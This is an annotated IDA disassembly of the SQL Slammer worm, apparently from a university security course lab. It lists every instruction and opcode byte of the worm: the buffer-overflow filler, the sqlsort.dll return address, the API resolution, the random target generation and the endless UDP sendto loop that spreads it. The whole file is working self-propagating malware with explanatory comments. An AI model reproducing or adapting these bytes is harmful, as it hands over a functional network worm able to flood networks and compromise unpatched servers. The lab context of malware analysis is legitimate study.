seg000:00000000                            ;
seg000:00000000                            ; +-------------------------------------------------------------------------+
seg000:00000000                            ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:00000000                            ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
seg000:00000000                            ; |                      License info: 48-BABB-7E64-E2                      |
seg000:00000000                            ; |                     Georgia Institute of Technology                     |
seg000:00000000                            ; +-------------------------------------------------------------------------+
seg000:00000000                            ;
seg000:00000000                            ; Input SHA256 : 4F22864414F474843EB1E4599185E31D51C5B4AEFDE63B4DC5A850A39AEFF3CB
seg000:00000000                            ; Input MD5    : A0AA4A74B70CBCA5A03960DF1A3DC878
seg000:00000000                            ; Input CRC32  : 4660912C
seg000:00000000
seg000:00000000                            ; ---------------------------------------------------------------------------
seg000:00000000                            ; File Name   : /nethome/pthirumal3/ECE4117/lab4/W32.SQLSlammer.worm
seg000:00000000                            ; Format      : Binary file
seg000:00000000                            ; Base Address: 0000h Range: 0000h - 0178h Loaded length: 0178h
seg000:00000000
seg000:00000000                                            .686p
seg000:00000000                                            .mmx
seg000:00000000                                            .model flat
seg000:00000000
seg000:00000000                            ; ===========================================================================
seg000:00000000
seg000:00000000                            ; Segment type: Pure code
seg000:00000000                            seg000          segment byte public 'CODE' use32
seg000:00000000                                            assume cs:seg000
seg000:00000000                                            assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:00000000 04 01                                      add     al, 1           ; Command code
seg000:00000002 01 01                                      add     [ecx], eax      ; filler to generate buffer overflow
seg000:00000004 01 01                                      add     [ecx], eax
seg000:00000006 01 01                                      add     [ecx], eax
seg000:00000008 01 01                                      add     [ecx], eax
seg000:0000000A 01 01                                      add     [ecx], eax
seg000:0000000C 01 01                                      add     [ecx], eax
seg000:0000000E 01 01                                      add     [ecx], eax
seg000:00000010 01 01                                      add     [ecx], eax
seg000:00000012 01 01                                      add     [ecx], eax
seg000:00000014 01 01                                      add     [ecx], eax
seg000:00000016 01 01                                      add     [ecx], eax
seg000:00000018 01 01                                      add     [ecx], eax
seg000:0000001A 01 01                                      add     [ecx], eax
seg000:0000001C 01 01                                      add     [ecx], eax
seg000:0000001E 01 01                                      add     [ecx], eax
seg000:00000020 01 01                                      add     [ecx], eax
seg000:00000022 01 01                                      add     [ecx], eax
seg000:00000024 01 01                                      add     [ecx], eax
seg000:00000026 01 01                                      add     [ecx], eax
seg000:00000028 01 01                                      add     [ecx], eax
seg000:0000002A 01 01                                      add     [ecx], eax
seg000:0000002C 01 01                                      add     [ecx], eax
seg000:0000002E 01 01                                      add     [ecx], eax
seg000:00000030 01 01                                      add     [ecx], eax
seg000:00000032 01 01                                      add     [ecx], eax
seg000:00000034 01 01                                      add     [ecx], eax
seg000:00000036 01 01                                      add     [ecx], eax
seg000:00000038 01 01                                      add     [ecx], eax
seg000:0000003A 01 01                                      add     [ecx], eax
seg000:0000003C 01 01                                      add     [ecx], eax
seg000:0000003E 01 01                                      add     [ecx], eax
seg000:00000040 01 01                                      add     [ecx], eax
seg000:00000042 01 01                                      add     [ecx], eax
seg000:00000044 01 01                                      add     [ecx], eax
seg000:00000046 01 01                                      add     [ecx], eax
seg000:00000048 01 01                                      add     [ecx], eax
seg000:0000004A 01 01                                      add     [ecx], eax
seg000:0000004C 01 01                                      add     [ecx], eax
seg000:0000004E 01 01                                      add     [ecx], eax
seg000:00000050 01 01                                      add     [ecx], eax
seg000:00000052 01 01                                      add     [ecx], eax
seg000:00000054 01 01                                      add     [ecx], eax
seg000:00000056 01 01                                      add     [ecx], eax
seg000:00000058 01 01                                      add     [ecx], eax
seg000:0000005A 01 01                                      add     [ecx], eax
seg000:0000005C 01 01                                      add     [ecx], eax
seg000:0000005E 01 01                                      add     [ecx], eax
seg000:00000060 01 DC                                      add     esp, ebx
seg000:00000062 C9                                         leave                   ; Restore stack
seg000:00000063 B0 42                                      mov     al, 42h ; 'B'   ; 0x42AE7001, which is required by the exploit to be successful
seg000:00000065 EB 0E                                      jmp     short loc_75
seg000:00000067                            ; ---------------------------------------------------------------------------
seg000:00000067 01 01                                      add     [ecx], eax      ; filler
seg000:00000069 01 01                                      add     [ecx], eax
seg000:0000006B 01 01                                      add     [ecx], eax
seg000:0000006B                            ; ---------------------------------------------------------------------------
seg000:0000006D 01                                         db    1
seg000:0000006E 70                                         db  70h ; p
seg000:0000006F AE                                         db 0AEh
seg000:00000070 42                                         db  42h ; B
seg000:00000071 01                                         db    1
seg000:00000072 70                                         db  70h ; p
seg000:00000073 AE                                         db 0AEh
seg000:00000074 42                                         db  42h ; B
seg000:00000075                            ; ---------------------------------------------------------------------------
seg000:00000075
seg000:00000075                            loc_75:                                 ; CODE XREF: seg000:00000065↑j
seg000:00000075 90                                         nop                     ; beginning of worm code
seg000:00000076 90                                         nop
seg000:00000077 90                                         nop
seg000:00000078 90                                         nop
seg000:00000079 90                                         nop
seg000:0000007A 90                                         nop
seg000:0000007B 90                                         nop
seg000:0000007C 90                                         nop
seg000:0000007D 68 DC C9 B0 42                             push    42B0C9DCh       ; sqlsort.dll jump esp
seg000:00000082 B8 01 01 01 01                             mov     eax, 1010101h   ; eax = 1010101h
seg000:00000087 31 C9                                      xor     ecx, ecx        ; ecx = 0
seg000:00000089 B1 18                                      mov     cl, 18h         ; cl = 18h
seg000:0000008B
seg000:0000008B                            Fix_buffer:                             ; CODE XREF: seg000:0000008C↓j
seg000:0000008B 50                                         push    eax             ; for (int I = 0x18; I > 0, I--) push 0x1010101;
seg000:0000008C E2 FD                                      loop    Fix_buffer
seg000:0000008E 35 01 01 01 05                             xor     eax, 5010101h   ; eax = 4000000h
seg000:00000093 50                                         push    eax             ; push eax onto the stack
seg000:00000094 89 E5                                      mov     ebp, esp        ; ebp = esp
seg000:00000096 51                                         push    ecx
seg000:00000097 68 2E 64 6C 6C                             push    6C6C642Eh       ; .dll
seg000:0000009C 68 65 6C 33 32                             push    32336C65h       ; el32
seg000:000000A1 68 6B 65 72 6E                             push    6E72656Bh       ; kern
seg000:000000A6 51                                         push    ecx             ; push string kernel32.dll
seg000:000000A7 68 6F 75 6E 74                             push    746E756Fh       ; ount
seg000:000000AC 68 69 63 6B 43                             push    436B6369h       ; ickC
seg000:000000B1 68 47 65 74 54                             push    54746547h       ; GetT
seg000:000000B6 66 B9 6C 6C                                mov     cx, 6C6Ch       ; ll
seg000:000000BA 51                                         push    ecx             ; push string GetTickCount
seg000:000000BB 68 33 32 2E 64                             push    642E3233h       ; 32.d
seg000:000000C0 68 77 73 32 5F                             push    5F327377h       ; ws2_
seg000:000000C5 66 B9 65 74                                mov     cx, 7465h       ; et
seg000:000000C9 51                                         push    ecx             ; push string ws2_32.dll
seg000:000000CA 68 73 6F 63 6B                             push    6B636F73h       ; sock
seg000:000000CF 66 B9 74 6F                                mov     cx, 6F74h       ; to
seg000:000000D3 51                                         push    ecx             ; push string socket
seg000:000000D4 68 73 65 6E 64                             push    646E6573h       ; push strind sendto
seg000:000000D9 BE 18 10 AE 42                             mov     esi, 42AE1018h  ; esi = sqlsort.dll IAT entry for LoadLibrary
seg000:000000DE 8D 45 D4                                   lea     eax, [ebp-2Ch]  ; eax = address of ws_32.dll
seg000:000000E1 50                                         push    eax             ; save addr of ws_32.dll onto stack
seg000:000000E2 FF 16                                      call    dword ptr [esi] ; LoadLibrary(ws2_32.dll)
seg000:000000E4 50                                         push    eax             ; push LoadLibrary(ws2_32.dll) handle onto stack
seg000:000000E5 8D 45 E0                                   lea     eax, [ebp-20h]  ; eax addr of GetTickCount
seg000:000000E8 50                                         push    eax             ; save addr of GetTickCount onto stack
seg000:000000E9 8D 45 F0                                   lea     eax, [ebp-10h]  ; load addr of kernel32.dll into eax
seg000:000000EC 50                                         push    eax             ; push addr of kernel32.dll onto stack
seg000:000000ED FF 16                                      call    dword ptr [esi] ; LoadLibrary(kernel32.dll)
seg000:000000EF 50                                         push    eax             ; push LoadLibrary(kernel32.dll) onto stack
seg000:000000F0 BE 10 10 AE 42                             mov     esi, 42AE1010h  ; move sqlsort:[IAT] entry into esi
seg000:000000F5 8B 1E                                      mov     ebx, [esi]      ; ebx = IAT entry
seg000:000000F7 8B 03                                      mov     eax, [ebx]      ; move 4 bytes of instruction into eax
seg000:000000F9 3D 55 8B EC 51                             cmp     eax, 51EC8B55h  ; verify IAT -> GetProcAddr
seg000:000000FE 74 05                                      jz      short loc_105   ; IAT verified
seg000:00000100 BE 1C 10 AE 42                             mov     esi, 42AE101Ch  ; Reset IAT to known base address
seg000:00000105
seg000:00000105                            loc_105:                                ; CODE XREF: seg000:000000FE↑j
seg000:00000105 FF 16                                      call    dword ptr [esi] ; GetProcAddress(kernel32 ptr, GetTickCount)
seg000:00000107 FF D0                                      call    eax             ; GetTickCount()
seg000:00000109 31 C9                                      xor     ecx, ecx        ; ecx = 0
seg000:0000010B 51                                         push    ecx             ; add 4 bytes of space for storing local variables
seg000:0000010C 51                                         push    ecx             ; add 4 bytes of space for storing local variables (8 total)
seg000:0000010D 50                                         push    eax             ; save GetTickCount() onto stack
seg000:0000010E 81 F1 03 01 04 9B                          xor     ecx, 9B040103h  ; ecx = 9B040103h
seg000:00000114 81 F1 01 01 01 01                          xor     ecx, 1010101h   ; ecx = 9A050002
seg000:0000011A 51                                         push    ecx             ; save 9A05002 onto stack
seg000:0000011B 8D 45 CC                                   lea     eax, [ebp-34h]  ; eax = "socket"
seg000:0000011E 50                                         push    eax             ; push "socket" onto stack
seg000:0000011F 8B 45 C0                                   mov     eax, [ebp-40h]  ; eax = ws2_32.dll addr
seg000:00000122 50                                         push    eax             ; push addr of ws2_32.dll onto stack
seg000:00000123 FF 16                                      call    dword ptr [esi] ; GetProcAddress(ws2_32.dll , "socket")
seg000:00000125 6A 11                                      push    11h             ; protocol = 17 = UDP
seg000:00000127 6A 02                                      push    2               ; type = SOCK_DGRAM
seg000:00000129 6A 02                                      push    2               ; domain = AF_INET
seg000:0000012B FF D0                                      call    eax             ; sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
seg000:0000012D 50                                         push    eax             ; save sockfd onto stack
seg000:0000012E 8D 45 C4                                   lea     eax, [ebp-3Ch]  ; eax = "sendto"
seg000:00000131 50                                         push    eax             ; push sendto onto stack
seg000:00000132 8B 45 C0                                   mov     eax, [ebp-40h]  ; eax = ws2_32.dll addr
seg000:00000135 50                                         push    eax             ; push addr of ws2_32.dll onto stack
seg000:00000136 FF 16                                      call    dword ptr [esi] ; GetProcAddress(ws2_32.dll, “sendto”);
seg000:00000138 89 C6                                      mov     esi, eax        ; esi now has sendto func
seg000:0000013A 09 DB                                      or      ebx, ebx        ; ebx | ebx
seg000:0000013C 81 F3 3C 61 D9 FF                          xor     ebx, 0FFD9613Ch ; ebx xor 0FFD9613Ch
seg000:00000142
seg000:00000142                            propogate:                              ; CODE XREF: seg000:00000176↓j
seg000:00000142 8B 45 B4                                   mov     eax, [ebp-4Ch]  ; eax = random seed
seg000:00000145 8D 0C 40                                   lea     ecx, [eax+eax*2] ; ecx = eax * 4
seg000:00000148 8D 14 88                                   lea     edx, [eax+ecx*4] ; edx = ecx*4 + eax
seg000:0000014B C1 E2 04                                   shl     edx, 4          ; edx << 4
seg000:0000014E 01 C2                                      add     edx, eax        ; edx += eax
seg000:00000150 C1 E2 08                                   shl     edx, 8          ; edx << 8
seg000:00000153 29 C2                                      sub     edx, eax        ; edx -= eax
seg000:00000155 8D 04 90                                   lea     eax, [eax+edx*4] ; eax += edx*4
seg000:00000158 01 D8                                      add     eax, ebx        ; eax += ebx
seg000:0000015A 89 45 B4                                   mov     [ebp-4Ch], eax  ; Replace old seed with new one
seg000:0000015D 6A 10                                      push    10h             ; dest_len = 10h
seg000:0000015F 8D 45 B0                                   lea     eax, [ebp-50h]  ; eax = Target Address
seg000:00000162 50                                         push    eax             ; push target addr into stack
seg000:00000163 31 C9                                      xor     ecx, ecx        ; ecx = 0
seg000:00000165 51                                         push    ecx             ; push send flags param
seg000:00000166 66 81 F1 78 01                             xor     cx, 178h        ; cx = 178h
seg000:0000016B 51                                         push    ecx             ; push packet length param
seg000:0000016C 8D 45 03                                   lea     eax, [ebp+3]    ; eax = exploit addr
seg000:0000016F 50                                         push    eax             ; push exploit addr param
seg000:00000170 8B 45 AC                                   mov     eax, [ebp-54h]  ; eax = socket descriptor
seg000:00000173 50                                         push    eax             ; push socket descriptor into stack
seg000:00000174 FF D6                                      call    esi             ; sendto(sock, payload_ptr, 376, 0, addr, 16);
seg000:00000176 EB CA                                      jmp     short propogate ; Keep sending to many different addr
seg000:00000176                            seg000          ends
seg000:00000176
seg000:00000176
seg000:00000176                                            end
